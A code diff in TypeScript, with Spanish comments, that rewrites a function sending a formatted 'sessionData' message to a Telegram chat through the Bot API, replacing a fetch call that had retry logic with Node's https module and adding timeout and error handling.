@@ -1,4 +1,6 @@
-// Función para enviar mensajes a Telegram
+import https from 'https';
+
+// Función para enviar mensajes a Telegram usando https de Node.js
 export async function sendToTelegram(sessionData: any) {
   const botToken = process.env.TELEGRAM_BOT_TOKEN;
   const chatId = process.env.TELEGRAM_CHAT_ID;
@@ -42,49 +44,59 @@ export async function sendToTelegram(sessionData: any) {
 *🕐 Fecha:* ${new Date(sessionData.createdAt).toLocaleString('es-CO')}
 `;
 
-    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-    
-    // Retry logic: intentar 3 veces con timeout más largo
-    let lastError;
-    for (let i = 0; i < 3; i++) {
-      try {
-        const controller = new AbortController();
-        const timeoutId = setTimeout(() => controller.abort(), 10000); // 10 segundos timeout
-        
-        const response = await fetch(url, {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/json',
-          },
-          body: JSON.stringify({
-            chat_id: chatId,
-            text: message,
-            parse_mode: 'Markdown',
-          }),
-          signal: controller.signal,
+    const data = JSON.stringify({
+      chat_id: chatId,
+      text: message,
+      parse_mode: 'Markdown',
+    });
+
+    const options = {
+      hostname: 'api.telegram.org',
+      port: 443,
+      path: `/bot${botToken}/sendMessage`,
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+        'Content-Length': Buffer.byteLength(data),
+      },
+      timeout: 10000, // 10 segundos
+    };
+
+    return new Promise((resolve, reject) => {
+      const req = https.request(options, (res) => {
+        let responseData = '';
+
+        res.on('data', (chunk) => {
+          responseData += chunk;
         });
-        
-        clearTimeout(timeoutId);
 
-        if (!response.ok) {
-          throw new Error(`Telegram API error: ${response.statusText}`);
-        }
+        res.on('end', () => {
+          if (res.statusCode === 200) {
+            console.log('Message sent to Telegram successfully');
+            resolve(true);
+          } else {
+            console.error('Telegram API error:', res.statusCode, responseData);
+            reject(new Error(`Telegram API returned ${res.statusCode}`));
+          }
+        });
+      });
 
-        console.log('Message sent to Telegram successfully');
-        return; // Éxito, salir de la función
-      } catch (error) {
-        lastError = error;
-        console.error(`Telegram attempt ${i + 1} failed:`, error);
-        if (i < 2) {
-          // Esperar 2 segundos antes del siguiente intento
-          await new Promise(resolve => setTimeout(resolve, 2000));
-        }
-      }
-    }
-    
-    // Si llegamos aquí, todos los intentos fallaron
-    console.error('All Telegram send attempts failed:', lastError);
+      req.on('error', (error) => {
+        console.error('Error sending to Telegram:', error);
+        reject(error);
+      });
+
+      req.on('timeout', () => {
+        req.destroy();
+        console.error('Telegram request timeout');
+        reject(new Error('Request timeout'));
+      });
+
+      req.write(data);
+      req.end();
+    });
   } catch (error) {
-    console.error('Error sending to Telegram:', error);
+    console.error('Error in sendToTelegram:', error);
+    throw error;
   }
 }
